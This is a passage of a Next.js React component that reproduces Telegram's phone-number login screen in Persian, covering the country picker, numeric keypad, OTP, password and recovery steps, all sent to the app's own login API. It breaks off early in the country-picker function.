'use client';

import { useCallback, useEffect, useMemo, useRef, useState, type PointerEvent } from 'react';
import { useRouter } from 'next/navigation';

import {
  closeHistoryOverlay,
  replaceHistoryOverlay,
  useHistoryOverlay,
} from '@/components/overlay/useHistoryOverlay';
import { usePageBackOverride, usePageBackVisible } from '@/components/Page';
import { useSession } from '@/components/SessionProvider';
import {
  DEFAULT_COUNTRY,
  countryKey,
  formatNationalNumber,
  groupCountries,
  hintFromPattern,
  languageFlag,
  maxDigits,
  resolveCountryCodeInput,
  searchCountries,
  type CountryFieldState,
  type TelegramCountry,
} from '@/lib/telegramCountries';
import { resolveLoginNext } from '@/lib/chatGate';
import { telegramLogin, TelegramLoginApiError, type TelegramLoginResponse } from '@/lib/telegramLogin';
import { COPY, type LoginAlert, type LoginPage } from '@/lib/telegramLoginCopy';

import {
  EMPTY_FORM,
  FAB_PAGES,
  KEYBOARD_PAGES,
  LoginAlertDialog,
  LoginInnerPage,
  confirmBackAlert,
  otpLengthFor,
  previousPage,
  type LoginForm,
} from './LoginPages';

import './telegram-login.css';

type FieldFocus = 'code' | 'phone';
type FabIcon = 'arrow' | 'progress' | 'check';

const KEYS: { num: string; letters: string }[] = [
  { num: '1', letters: '' },
  { num: '2', letters: 'ABC' },
  { num: '3', letters: 'DEF' },
  { num: '4', letters: 'GHI' },
  { num: '5', letters: 'JKL' },
  { num: '6', letters: 'MNO' },
  { num: '7', letters: 'PQRS' },
  { num: '8', letters: 'TUV' },
  { num: '9', letters: 'WXYZ' },
  { num: '', letters: '' },
  { num: '0', letters: '+' },
];

function SearchIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" aria-hidden>
      <path
        d="M15.5 14h-.79l-.28-.27A6.47 6.47 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14"
        fill="currentColor"
      />
    </svg>
  );
}

function ChevronIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden>
      <path
        d="M8.6 7.4 10 6l6 6-6 6-1.4-1.4 4.6-4.6z"
        fill="currentColor"
      />
    </svg>
  );
}

function ArrowIcon() {
  return (
    <svg width="26" height="26" viewBox="0 0 24 24" aria-hidden>
      <path
        d="M5 12h12M13 6l6 6-6 6"
        fill="none"
        stroke="currentColor"
        strokeWidth="2.2"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
    </svg>
  );
}

function CheckIcon() {
  return (
    <svg width="26" height="26" viewBox="0 0 24 24" aria-hidden>
      <path
        d="M5 12.5 9.5 17 19 7"
        fill="none"
        stroke="currentColor"
        strokeWidth="2.4"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
    </svg>
  );
}

function SpinnerIcon() {
  return (
    <svg className="tg-spinner" width="24" height="24" viewBox="0 0 24 24" aria-hidden>
      <circle
        cx="12"
        cy="12"
        r="9"
        fill="none"
        stroke="currentColor"
        strokeWidth="2.4"
        strokeLinecap="round"
        strokeDasharray="40 18"
      />
    </svg>
  );
}

function BackspaceIcon() {
  return (
    <svg width="26" height="26" viewBox="0 0 24 24" aria-hidden>
      <path
        d="M22 6.5v11A1.5 1.5 0 0 1 20.5 19h-11a1.5 1.5 0 0 1-1.15-.52L2.4 12.7a1 1 0 0 1 0-1.4l5.95-5.78A1.5 1.5 0 0 1 9.5 5h11A1.5 1.5 0 0 1 22 6.5z"
        fill="none"
        stroke="currentColor"
        strokeWidth="1.6"
        strokeLinejoin="round"
      />
      <path
        d="m10.2 9 5.6 6M15.8 9l-5.6 6"
        fill="none"
        stroke="currentColor"
        strokeWidth="1.6"
        strokeLinecap="round"
      />
    </svg>
  );
}

function Flag({ iso }: { iso: string }) {
  const flag = languageFlag(iso);

  if (!flag) {
    return null;
  }

  return (
    <span className="tg-flag" aria-hidden>
      {flag}
    </span>
  );
}

function ContactsOnIcon() {
  return (
    <svg width="24" height="24" viewBox="0 0 24 24" aria-hidden>
      <path
        d="M16 11a3 3 0 1 0-3-3 3 3 0 0 0 3 3Zm-8 0a3 3 0 1 0-3-3 3 3 0 0 0 3 3Zm0 2c-2.67 0-8 1.34-8 4v2h10v-2c0-1.31.67-2.47 1.76-3.35A10.2 10.2 0 0 0 8 13Zm8 0c-.37 0-.82.03-1.28.08A5.32 5.32 0 0 1 16 17v2h8v-2c0-2.66-5.33-4-8-4Z"
        fill="currentColor"
      />
    </svg>
  );
}

function ContactsOffIcon() {
  return (
    <svg width="24" height="24" viewBox="0 0 24 24" aria-hidden>
      <path
        d="M12 12a4 4 0 1 0-4-4 4 4 0 0 0 4 4Zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4Z"
        fill="currentColor"
      />
      <path
        d="M3.4 4.8 4.8 3.4l16.8 16.8-1.4 1.4Z"
        fill="currentColor"
      />
    </svg>
  );
}

function Caret() {
  return <span className="tg-caret" />;
}

export function TelegramLoginScreen({
  locked = false,
  rising = false,
  onFinished,
  onDismiss,
}: {
  locked?: boolean;
  rising?: boolean;
  onFinished?: (path: '/' | '/chat') => void;
  onDismiss?: () => void;
}) {
  const router = useRouter();
  const { setSession } = useSession();
  const [page, setPage] = useState<LoginPage>('phone');
  const [country, setCountry] = useState<TelegramCountry | null>(DEFAULT_COUNTRY);
  const [countryState, setCountryState] = useState<CountryFieldState>('valid');
  const [code, setCode] = useState(DEFAULT_COUNTRY.code);
  const [national, setNational] = useState('');
  const [focus, setFocus] = useState<FieldFocus>('phone');
  const [syncContacts, setSyncContacts] = useState(true);
  const [bulletin, setBulletin] = useState<{ on: boolean; key: number } | null>(null);
  const [bulletinOut, setBulletinOut] = useState(false);
  const [pickerOpen, setPickerOpen] = useState(false);
  const [confirmOpen, setConfirmOpen] = useState(false);
  const [fabIcon, setFabIcon] = useState<FabIcon>('arrow');
  const [shake, setShake] = useState(false);
  const [otp, setOtp] = useState('');
  const [otpError, setOtpError] = useState(false);
  const [form, setForm] = useState<LoginForm>(EMPTY_FORM);
  const [fieldError, setFieldError] = useState(false);
  const [alert, setAlert] = useState<LoginAlert | null>(null);
  const [loginId, setLoginId] = useState('');
  const [timeout, setTimeoutSeconds] = useState(0);
  const [codeLength, setCodeLength] = useState(5);
  const [nextType, setNextType] = useState<LoginPage | null>(null);
  const [missedPrefix, setMissedPrefix] = useState('');
  const [fragmentUrl, setFragmentUrl] = useState('');
  const [wordBeginning, setWordBeginning] = useState('');
  const [emailPattern, setEmailPattern] = useState('');
  const [googleSigninAllowed, setGoogleSigninAllowed] = useState(false);
  const [recoveryEmailPattern, setRecoveryEmailPattern] = useState('');
  const [resetWaitUntil, setResetWaitUntil] = useState<string | null>(null);
  const [floodWaitSeconds, setFloodWaitSeconds] = useState(60);
  const [errorDetail, setErrorDetail] = useState('');
  const lastMatchedIso = useRef<Record<string, string>>({});
  const backspaceTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
  const backspaceRepeat = useRef<ReturnType<typeof setInterval> | null>(null);
  const bulletinHide = useRef<ReturnType<typeof setTimeout> | null>(null);
  const bulletinRemove = useRef<ReturnType<typeof setTimeout> | null>(null);
  const pageRef = useRef<LoginPage>('phone');
  const loginIdRef = useRef('');
  const codePageRef = useRef<LoginPage>('sms');
  const overlayOpen = pickerOpen || confirmOpen || alert !== null;
  const lockedRef = useRef(locked);
  const onDismissRef = useRef(onDismiss);
  const onFinishedRef = useRef(onFinished);
  lockedRef.current = locked;
  onDismissRef.current = onDismiss;
  onFinishedRef.current = onFinished;

  pageRef.current = page;
  loginIdRef.current = loginId;

  const pattern = country?.pattern ?? '';
  const formatted = formatNationalNumber(national, pattern);
  const hint = countryState === 'valid' ? hintFromPattern(pattern) : '';
  const displayCode = code || '';
  const fullNumber = `+${displayCode}${formatted ? ` ${formatted}` : ''}`.trim();
  const countryFilled = countryState === 'valid' && country !== null;
  const showWrongCountry = countryState === 'invalid' && focus === 'phone';
  const showKeyboard = KEYBOARD_PAGES.includes(page) && !confirmOpen && !pickerOpen;
  const showFab = FAB_PAGES.includes(page) && !pickerOpen && (page !== 'phone' || !confirmOpen);
  const otpLen = codeLength > 0 ? codeLength : otpLengthFor(page);
  const countryName = country?.nameFa ?? COPY.country;
  const overlayOpenRef = useRef(overlayOpen);
  overlayOpenRef.current = overlayOpen;
  const skipPagePush = useRef(false);
  const ignoreHistoryPopRef = useRef(false);
  const ignoreHistoryPopTimer = useRef<ReturnType<typeof setTimeout> | null>(null);

  const ignoreNextHistoryPop = useCallback(() => {
    ignoreHistoryPopRef.current = true;
    if (ignoreHistoryPopTimer.current) {
      clearTimeout(ignoreHistoryPopTimer.current);
    }
    ignoreHistoryPopTimer.current = setTimeout(() => {
      ignoreHistoryPopRef.current = false;
      ignoreHistoryPopTimer.current = null;
    }, 400);
  }, []);

  const abortLoginToPhone = useCallback(() => {
    const id = loginIdRef.current;
    if (id) {
      void telegramLogin({ action: 'cancel', loginId: id }).catch(() => undefined);
    }
    loginIdRef.current = '';
    setLoginId('');
    setOtp('');
    setOtpError(false);
    setFieldError(false);
    setForm(EMPTY_FORM);
    setTimeoutSeconds(0);
    setCodeLength(5);
    setNextType(null);
    setMissedPrefix('');
    setFragmentUrl('');
    setWordBeginning('');
    setEmailPattern('');
    setGoogleSigninAllowed(false);
    setRecoveryEmailPattern('');
    setResetWaitUntil(null);
    setErrorDetail('');
    setFabIcon('arrow');
    setAlert(null);
    setConfirmOpen(false);
    skipPagePush.current = true;
    setPage('phone');
    window.history.replaceState({}, '');
  }, []);

  const requestLeaveConfirm = useCallback((current: LoginPage) => {
    const nextAlert = confirmBackAlert(current);
    if (!nextAlert) {
      return false;
    }
    setAlert(nextAlert);
    return true;
  }, []);

  usePageBackVisible(page !== 'phone');

  usePageBackOverride(() => {
    if (overlayOpenRef.current) {
      return true;
    }
    const current = pageRef.current;
    if (current === 'phone') {
      if (lockedRef.current) {
        return false;
      }
      if (onDismissRef.current) {
        onDismissRef.current();
        return false;
      }
      return true;
    }
    return !requestLeaveConfirm(current);
  });

  const tapHaptic = () => {
    if (typeof navigator !== 'undefined' && navigator.vibrate) {
      navigator.vibrate(10);
    }
  };

  const showSyncBulletin = (on: boolean) => {
    if (bulletinHide.current) {
      clearTimeout(bulletinHide.current);
    }
    if (bulletinRemove.current) {
      clearTimeout(bulletinRemove.current);
    }

    setBulletin({ on, key: Date.now() });
    setBulletinOut(false);
    bulletinHide.current = setTimeout(() => {
      setBulletinOut(true);
      bulletinRemove.current = setTimeout(() => {
        setBulletin(null);
        setBulletinOut(false);
      }, 220);
    }, 2500);
  };

  useEffect(
    () => () => {
      if (bulletinHide.current) {
        clearTimeout(bulletinHide.current);
      }
      if (bulletinRemove.current) {
        clearTimeout(bulletinRemove.current);
      }
    },
    [],
  );

  const goToPage = useCallback((next: LoginPage) => {
    setOtp('');
    setOtpError(false);
    setFieldError(false);
    setFabIcon('arrow');
    setConfirmOpen(false);
    setPage(next);
  }, []);

  const applyStep = useCallback(
    (result: TelegramLoginResponse) => {
      if (result.loginId) {
        setLoginId(result.loginId);
      }
      setTimeoutSeconds(result.timeout);
      setCodeLength(result.codeLength);
      setNextType(result.nextType);
      if (result.missedPrefix) {
        setMissedPrefix(result.missedPrefix);
      }
      setFragmentUrl(result.fragmentUrl || '');
      setWordBeginning(result.wordBeginning || '');
      if (result.emailPattern) {
        setEmailPattern(result.emailPattern);
        setForm((current) => ({ ...current, email: current.email || result.emailPattern || '' }));
      }
      setGoogleSigninAllowed(Boolean(result.googleSigninAllowed));
      if (result.passwordHint) {
        setForm((current) => ({ ...current, hint: result.passwordHint || '' }));
      }
      if (result.recoveryEmailPattern) {
        setRecoveryEmailPattern(result.recoveryEmailPattern);
      }
      setResetWaitUntil(result.resetWaitUntil ?? null);
      if (result.session) {
        setSession(result.session);
      }
      if (
        result.page === 'sms' ||
        result.page === 'app' ||
        result.page === 'call' ||
        result.page === 'flash' ||
        result.page === 'missed' ||
        result.page === 'fragment' ||
        result.page === 'word' ||
        result.page === 'phrase'
      ) {
        codePageRef.current = result.page;
      }
      const nextPage =
        result.page && result.page !== 'phone'
          ? result.page
          : result.loginId
            ? 'sms'
            : 'phone';
      goToPage(nextPage);
    },
    [goToPage, setSession],
  );

  const handleLoginError = useCallback(
    (error: unknown, otpFail = false) => {
      setFabIcon('arrow');
      if (error instanceof TelegramLoginApiError) {
        if (error.floodWaitSeconds) {
          setFloodWaitSeconds(error.floodWaitSeconds);
        }
        if (error.alert === 'wrongCode') {
          setOtpError(true);
          if (!otpFail) {
            setAlert('wrongCode');
          }
          return;
        }
        if (error.alert === 'codeExpired') {
          setAlert('codeExpired');
          goToPage('phone');
          setLoginId('');
          return;
        }
        if (error.alert) {
          setErrorDetail(error.message);
          setAlert(error.alert);
          return;
        }
        setErrorDetail(error.message);
        setAlert('serverError');
        return;
      }
      setErrorDetail(error instanceof Error ? error.message : COPY.serverError);
      setAlert('serverError');
    },
    [goToPage],
  );

  useEffect(() => {
    const onPopState = () => {
      if (overlayOpenRef.current || ignoreHistoryPopRef.current) {
        return;
      }

      const incoming = window.history.state as { loginPage?: string } | null;
      const current = pageRef.current;
      if (incoming?.loginPage === current) {
        return;
      }

      if (current === 'phone') {
        return;
      }

      if (requestLeaveConfirm(current)) {
        window.history.pushState({ loginPage: current }, '');
        return;
      }

      skipPagePush.current = true;
      setOtp('');
      setOtpError(false);
      setFieldError(false);
      setFabIcon('arrow');
      const back = previousPage(current);
      if (back === 'phone' && loginIdRef.current) {
        void telegramLogin({ action: 'cancel', loginId: loginIdRef.current }).catch(() => undefined);
        setLoginId('');
      }
      setPage(back);
    };

    window.addEventListener('popstate', onPopState);
    return () => {
      window.removeEventListener('popstate', onPopState);
      if (ignoreHistoryPopTimer.current) {
        clearTimeout(ignoreHistoryPopTimer.current);
      }
    };
  }, [requestLeaveConfirm]);

  useEffect(() => {
    if (skipPagePush.current) {
      skipPagePush.current = false;
      return;
    }

    if (page === 'phone') {
      return;
    }

    const state = window.history.state as { loginPage?: string; overlay?: number } | null;
    if (state?.overlay) {
      window.history.replaceState({ loginPage: page }, '');
      return;
    }
    if (state?.loginPage !== page) {
      window.history.pushState({ loginPage: page }, '');
    }
  }, [page]);

  const commitCode = useCallback((raw: string) => {
    const resolved = resolveCountryCodeInput(raw, lastMatchedIso.current);
    setCode(resolved.code);
    setCountry(resolved.country);
    setCountryState(resolved.state);

    if (resolved.overflow) {
      setNational((current) => `${resolved.overflow}${current}`.replace(/\D/g, ''));
    }

    if (resolved.jumpToPhone) {
      setFocus('phone');
    }
  }, []);

  const finishOtp = useCallback(
    (value: string) => {
      const currentLoginId = loginIdRef.current;
      const currentPage = pageRef.current;
      if (!currentLoginId) {
        setOtpError(true);
        return;
      }

      setFabIcon('progress');
      const run = async () => {
        try {
          if (currentPage === 'recover') {
            applyStep(
              await telegramLogin({ action: 'submitRecoveryCode', loginId: currentLoginId, code: value }),
            );
            return;
          }
          if (currentPage === 'emailCode' || currentPage === 'emailSetup') {
            applyStep(
              await telegramLogin({ action: 'submitEmailCode', loginId: currentLoginId, code: value }),
            );
            return;
          }
          applyStep(await telegramLogin({ action: 'submitCode', loginId: currentLoginId, code: value }));
        } catch (error) {
          handleLoginError(error, true);
        }
      };
      void run();
    },
    [applyStep, handleLoginError],
  );

  const applyDigit = useCallback(
    (digit: string) => {
      tapHaptic();

      if (page !== 'phone') {
        if (otpLen > 0) {
          setOtpError(false);
          setOtp((current) => {
            if (current.length >= otpLen) {
              return current;
            }
            const next = current + digit;
            if (next.length === otpLen) {
              window.setTimeout(() => finishOtp(next), 40);
            }
            return next;
          });
        }
        return;
      }

      if (focus === 'code') {
        commitCode(code + digit);
        return;
      }

      setNational((current) => {
        const limit = maxDigits(pattern);
        if (current.length >= limit) {
          return current;
        }
        return current + digit;
      });
    },
    [code, commitCode, finishOtp, focus, otpLen, page, pattern],
  );

  const deleteDigit = useCallback(() => {
    tapHaptic();

    if (page !== 'phone') {
      if (otpLen > 0) {
        setOtpError(false);
        setOtp((current) => current.slice(0, -1));
      }
      return;
    }

    if (focus === 'code') {
      commitCode(code.slice(0, -1));
      return;
    }

    setNational((current) => {
      if (current.length > 0) {
        return current.slice(0, -1);
      }
      setFocus('code');
      commitCode(code.slice(0, -1));
      return current;
    });
  }, [code, commitCode, focus, otpLen, page]);

  const stopBackspace = useCallback(() => {
    if (backspaceTimer.current) {
      clearTimeout(backspaceTimer.current);
      backspaceTimer.current = null;
    }
    if (backspaceRepeat.current) {
      clearInterval(backspaceRepeat.current);
      backspaceRepeat.current = null;
    }
  }, []);

  const startBackspace = useCallback(() => {
    deleteDigit();
    stopBackspace();
    backspaceTimer.current = setTimeout(() => {
      backspaceRepeat.current = setInterval(deleteDigit, 50);
    }, 200);
  }, [deleteDigit, stopBackspace]);

  useEffect(() => stopBackspace, [stopBackspace]);

  const openPicker = () => {
    setPickerOpen(true);
  };

  const sendAfterConfirm = useCallback(() => {
    const fail = (next: LoginAlert) => {
      setConfirmOpen(false);
      setFabIcon('arrow');
      setAlert(next);
    };

    if (countryState === 'empty' || !code) {
      fail('chooseCountry');
      return;
    }
    if (countryState === 'invalid') {
      fail('wrongCountry');
      return;
    }

    const needed = pattern.replace(/[^X]/g, '').length;
    if (needed > 0 && national.length < needed) {
      fail('shortNumber');
      return;
    }

    const phone = `+${code}${national}`;
    setFabIcon('progress');
    void telegramLogin({ action: 'sendCode', phone })
      .then((result) => {
        const nextPage =
          result.page && result.page !== 'phone'
            ? result.page
            : result.loginId
              ? 'sms'
              : 'phone';
        ignoreNextHistoryPop();
        replaceHistoryOverlay({ loginPage: nextPage });
        setConfirmOpen(false);
        applyStep(result);
      })
      .catch((error) => {
        ignoreNextHistoryPop();
        replaceHistoryOverlay({});
        setConfirmOpen(false);
        handleLoginError(error);
      });
  }, [applyStep, code, countryState, handleLoginError, ignoreNextHistoryPop, national, pattern]);

  const submitPhone = useCallback(() => {
    if (!code || !national) {
      setShake(true);
      window.setTimeout(() => setShake(false), 420);
      tapHaptic();
      return;
    }

    setFabIcon((current) => (current === 'progress' ? current : 'progress'));
    window.setTimeout(() => {
      setFabIcon('check');
      setConfirmOpen(true);
    }, 650);
  }, [code, national]);

  const submitFab = useCallback(() => {
    if (page === 'phone') {
      submitPhone();
      return;
    }

    const currentLoginId = loginIdRef.current;
    if (!currentLoginId) {
      setAlert('codeExpired');
      goToPage('phone');
      return;
    }

    if (page === 'password') {
      if (!form.password) {
        setFieldError(true);
        tapHaptic();
        return;
      }
      setFabIcon('progress');
      void telegramLogin({ action: 'password', loginId: currentLoginId, password: form.password })
        .then(applyStep)
        .catch(handleLoginError);
      return;
    }
    if (page === 'newPass1') {
      if (!form.password || form.password !== form.password2) {
        setFieldError(true);
        setAlert('passwordsMismatch');
        return;
      }
      setFabIcon('progress');
      void telegramLogin({
        action: 'setNewPassword',
        loginId: currentLoginId,
        password: form.password,
        password2: form.password2,
      })
        .then(applyStep)
        .catch(handleLoginError);
      return;
    }
    if (page === 'newPass2') {
      setFabIcon('progress');
      void telegramLogin({
        action: 'finishNewPassword',
        loginId: currentLoginId,
        hint: form.hint,
      })
        .then(applyStep)
        .catch(handleLoginError);
      return;
    }
    if (page === 'email') {
      if (!form.email.includes('@')) {
        setFieldError(true);
        tapHaptic();
        return;
      }
      setFabIcon('progress');
      void telegramLogin({ action: 'sendEmail', loginId: currentLoginId, email: form.email })
        .then(applyStep)
        .catch(handleLoginError);
      return;
    }
    if (page === 'word' || page === 'phrase') {
      if (!form.word.trim()) {
        setFieldError(true);
        tapHaptic();
        return;
      }
      setFabIcon('progress');
      void telegramLogin({ action: 'submitCode', loginId: currentLoginId, code: form.word.trim() })
        .then(applyStep)
        .catch(handleLoginError);
    }
  }, [applyStep, form, goToPage, handleLoginError, page, submitPhone]);

  useEffect(() => {
    if (pickerOpen || confirmOpen || alert) {
      return;
    }

    const onKeyDown = (event: KeyboardEvent) => {
      if (event.target instanceof HTMLInputElement) {
        return;
      }

      if (event.key >= '0' && event.key <= '9') {
        event.preventDefault();
        applyDigit(event.key);
        return;
      }

      if (event.key === 'Backspace') {
        event.preventDefault();
        deleteDigit();
        return;
      }

      if (event.key === 'Enter') {
        event.preventDefault();
        submitFab();
      }
    };

    window.addEventListener('keydown', onKeyDown);
    return () => window.removeEventListener('keydown', onKeyDown);
  }, [alert, applyDigit, confirmOpen, deleteDigit, pickerOpen, submitFab]);

  const closeConfirm = () => {
    setConfirmOpen(false);
    setFabIcon((icon) => (icon === 'progress' ? icon : 'arrow'));
  };

  const confirmYes = () => {
    if (fabIcon === 'progress') {
      return;
    }

    setFabIcon('progress');
    sendAfterConfirm();
  };

  const onInnerLink = (action: string) => {
    const currentLoginId = loginIdRef.current;

    if (action === 'resend' || action === 'to-sms') {
      if (!currentLoginId) {
        setAlert('codeExpired');
        return;
      }
      setFabIcon('progress');
      if (page === 'emailSetup' && form.email) {
        void telegramLogin({ action: 'sendEmail', loginId: currentLoginId, email: form.email })
          .then(applyStep)
          .catch(handleLoginError);
        return;
      }
      void telegramLogin({ action: 'resend', loginId: currentLoginId })
        .then(applyStep)
        .catch(handleLoginError);
      return;
    }
    if (action === 'fragment') {
      if (fragmentUrl) {
        window.open(fragmentUrl, '_blank', 'noopener,noreferrer');
        return;
      }
      setAlert('didNotGetCode');
      return;
    }
    if (action === 'did-not-get') {
      setAlert('didNotGetCode');
      return;
    }
    if (action === 'paste') {
      void navigator.clipboard?.readText().then((text) => {
        setForm((current) => ({ ...current, word: text.trim() }));
      });
      return;
    }
    if (action === 'tos') {
      setAlert('tos');
      return;
    }
    if (action === 'forgot') {
      if (!currentLoginId) {
        setAlert('codeExpired');
        return;
      }
      setFabIcon('progress');
      void telegramLogin({ action: 'requestRecovery', loginId: currentLoginId })
        .then((result) => {
          applyStep(result);
          setAlert('restoreEmail');
        })
        .catch(handleLoginError);
      return;
    }
    if (action === 'no-email') {
      setAlert('noEmail');
      return;
    }
    if (action === 'reset') {
      setAlert('resetWarning');
      return;
    }
    if (action === 'reset-email') {
      if (!currentLoginId) {
        return;
      }
      setFabIcon('progress');
      void telegramLogin({ action: 'resetEmail', loginId: currentLoginId })
        .then(applyStep)
        .catch(handleLoginError);
      return;
    }
    if (action === 'google') {
      setAlert('googleUnavailable');
      return;
    }
    if (action === 'skip-email') {
      if (!currentLoginId) {
        return;
      }
      void telegramLogin({ action: 'resetEmail', loginId: currentLoginId })
        .then(applyStep)
        .catch(handleLoginError);
      return;
    }
    if (action === 'pay') {
      if (!currentLoginId) {
        return;
      }
      setFabIcon('progress');
      void telegramLogin({ action: 'checkPaid', loginId: currentLoginId })
        .then(applyStep)
        .catch(handleLoginError);
      return;
    }
    if (action === 'home') {
      const path = resolveLoginNext(new URLSearchParams(window.location.search).get('next'));
      if (onFinishedRef.current) {
        onFinishedRef.current(path);
        return;
      }
      router.replace(path);
    }
  };

  const onAlertAction = (action: string) => {
    const current = alert;
    const currentLoginId = loginIdRef.current;
    closeHistoryOverlay();

    window.setTimeout(() => {
      if (action === 'edit') {
        abortLoginToPhone();
        return;
      }
      if (current === 'editNumber' || current === 'stopVerification') {
        return;
      }
      if (action === 'secondary') {
        if (current === 'tos') {
          setAlert('tosDecline');
          return;
        }
        if (current === 'tosDecline') {
          goToPage('phone');
          return;
        }
        if (current === 'stopLoading') {
          setFabIcon('arrow');
          return;
        }
        return;
      }
      if (current === 'tos' || current === 'tosDecline') {
        return;
      }
      if (current === 'noEmail') {
        if (!currentLoginId) {
          return;
        }
        setFabIcon('progress');
        void telegramLogin({ action: 'resetPassword', loginId: currentLoginId })
          .then(applyStep)
          .catch(handleLoginError);
        return;
      }
      if (current === 'restoreEmail') {
        goToPage('recover');
        return;
      }
      if (current === 'resetWarning') {
        if (!currentLoginId) {
          return;
        }
        setFabIcon('progress');
        void telegramLogin({ action: 'resetPassword', loginId: currentLoginId })
          .then(applyStep)
          .catch(handleLoginError);
        return;
      }
      if (current === 'didNotGetCode' && action === 'primary') {
        setAlert('noMail');
        return;
      }
      if ((current === 'invalidPhone' || current === 'bannedPhone') && action === 'primary') {
        setAlert('noMail');
        return;
      }
      if (current === 'codeExpired' || current === 'signUpRequired' || current === 'wrongAccount') {
        goToPage('phone');
        setLoginId('');
      }
    }, 40);
  };

  const blurred = confirmOpen || alert !== null;
  const fabEnd =
    page === 'password' ||
    page === 'newPass1' ||
    page === 'newPass2' ||
    page === 'word' ||
    page === 'phrase';

  return (
    <div className={`tg-login${rising ? ' is-rising' : ''}`}>
      <div className="tg-stage">
        <div className={`tg-phone${blurred ? ' is-blurred' : ''}`}>
          {page === 'phone' ? (
          <div className="tg-phone-body">
            <h1 className="tg-title">{COPY.yourNumber}</h1>
            <p className="tg-subtitle">{COPY.startText}</p>

            <div className="tg-fields">
              <div
                className={`tg-outline${countryFilled || showWrongCountry ? ' is-filled' : ' is-empty'}${
                  showWrongCountry ? ' is-invalid' : ''
                }`}
              >
                <span className="tg-outline-label">کشور</span>
                <button type="button" className="tg-country-row" onClick={openPicker}>
                  <span className="tg-chevron">
                    <ChevronIcon />
                  </span>
                  {countryFilled && country ? (
                    <span className="tg-country-main">
                      <Flag iso={country.iso} />
                      <span className="tg-country-name">{country.nameFa}</span>
                    </span>
                  ) : showWrongCountry ? (
                    <span className="tg-country-main">
                      <span className="tg-country-name">کشور اشتباه</span>
                    </span>
                  ) : null}
                </button>
              </div>

              <div
                className={`tg-outline is-active${shake ? ' is-shake' : ''}`}
                onClick={() => setFocus('phone')}
              >
                <span className="tg-outline-label">شماره تلفن</span>
                <div className="tg-phone-row">
                  <span className="tg-plus">+</span>
                  <button
                    type="button"
                    className="tg-code-wrap"
                    onClick={(event) => {
                      event.stopPropagation();
                      setFocus('code');
                    }}
                  >
                    <span className="tg-code">{displayCode}</span>
                    {focus === 'code' ? <Caret /> : null}
                  </button>
                  <span className="tg-divider" />
                  <div className="tg-national">
                    {formatted ? (
                      <span className="tg-national-text">{formatted}</span>
                    ) : hint ? (
                      <span className="tg-hint-text">{hint}</span>
                    ) : null}
                    {focus === 'phone' ? <Caret /> : null}
                  </div>
                </div>
              </div>
            </div>

            <button
              type="button"
              className="tg-check-row"
              onClick={() => {
                const next = !syncContacts;
                setSyncContacts(next);
                showSyncBulletin(next);
              }}
            >
              <span className={`tg-check${syncContacts ? ' is-on' : ''}`} />
              <span className="tg-check-label">{COPY.syncContacts}</span>
            </button>
          </div>
          ) : (
            <LoginInnerPage
              key={page}
              page={page}
              phone={fullNumber}
              otp={otp}
              otpError={otpError}
              form={form}
              nextType={nextType}
              missedPrefix={missedPrefix || `+${displayCode || '98'}`}
              fieldError={fieldError}
              timeout={timeout}
              codeLength={otpLen}
              fragmentUrl={fragmentUrl}
              wordBeginning={wordBeginning}
              emailPattern={page === 'recover' ? recoveryEmailPattern || emailPattern : emailPattern}
              googleSigninAllowed={googleSigninAllowed}
              resetWaitUntil={resetWaitUntil}
              onForm={(patch) => setForm((current) => ({ ...current, ...patch }))}
              onLink={onInnerLink}
            />
          )}

          {showFab && (
            <button
              type="button"
              className={`tg-fab${showKeyboard ? '' : ' is-floor'}${fabEnd ? ' is-end' : ''}${
                bulletin && !bulletinOut && showKeyboard ? ' is-raised' : ''
              }`}
              aria-label="ادامه"
              onClick={submitFab}
              disabled={fabIcon === 'progress'}
            >
              {fabIcon === 'progress' ? <SpinnerIcon /> : <ArrowIcon />}
            </button>
          )}

          {bulletin && page === 'phone' && !confirmOpen ? (
            <div key={bulletin.key} className={`tg-bulletin${bulletinOut ? ' is-out' : ''}`}>
              <span className="tg-bulletin-icon">
                {bulletin.on ? <ContactsOnIcon /> : <ContactsOffIcon />}
              </span>
              <span className="tg-bulletin-text">
                {bulletin.on ? COPY.syncOn : COPY.syncOff}
              </span>
            </div>
          ) : null}

          {showKeyboard ? (
          <div className="tg-keyboard">
            {KEYS.map((key) =>
              key.num === '' ? (
                <div key="empty" className="tg-key-spacer" />
              ) : (
                <button
                  key={key.num}
                  type="button"
                  className="tg-key"
                  onClick={() => applyDigit(key.num)}
                >
                  <span className="tg-key-inner">
                    <span className="tg-key-num">{key.num}</span>
                    <span className="tg-key-letters">{key.letters}</span>
                  </span>
                </button>
              ),
            )}
            <button
              type="button"
              className="tg-key"
              aria-label="حذف"
              onPointerDown={startBackspace}
              onPointerUp={stopBackspace}
              onPointerCancel={stopBackspace}
              onPointerLeave={stopBackspace}
            >
              <BackspaceIcon />
            </button>
          </div>
          ) : null}
        </div>

        {pickerOpen && (
          <CountryPicker
            onSelect={(next) => {
              lastMatchedIso.current[next.code] = next.iso;
              setCountry(next);
              setCountryState('valid');
              setCode(next.code);
              setFocus('phone');
            }}
            onClose={() => setPickerOpen(false)}
          />
        )}

        {confirmOpen && (
          <ConfirmLayer
            number={fullNumber}
            fabIcon={fabIcon}
            onYes={confirmYes}
            onClose={closeConfirm}
          />
        )}

        {alert && (
          <LoginAlertDialog
            alert={alert}
            phone={fullNumber}
            country={countryName}
            floodWaitSeconds={floodWaitSeconds}
            recoveryEmailPattern={recoveryEmailPattern}
            errorDetail={errorDetail}
            onClose={() => setAlert(null)}
            onAction={onAlertAction}
          />
        )}
      </div>
    </div>
  );
}

function CountryPicker({
  onSelect,
  onClose,
}: {
  onSelect: (country: TelegramCountry) => void;
  onClose: () => void;
}) {
  useHistoryOverlay(onClose);

  const [query, setQuery] = useState('');
  const [activeLetter, setActiveLetter] = useState<string | null>(null);
  const [bubbleY, setBubbleY] = useState<number | null>(null);
  const listRef = useRef<HTMLDivElement>(null);
  const sectionRefs = useRef<Record<string, HTMLDivElement | null>>({});
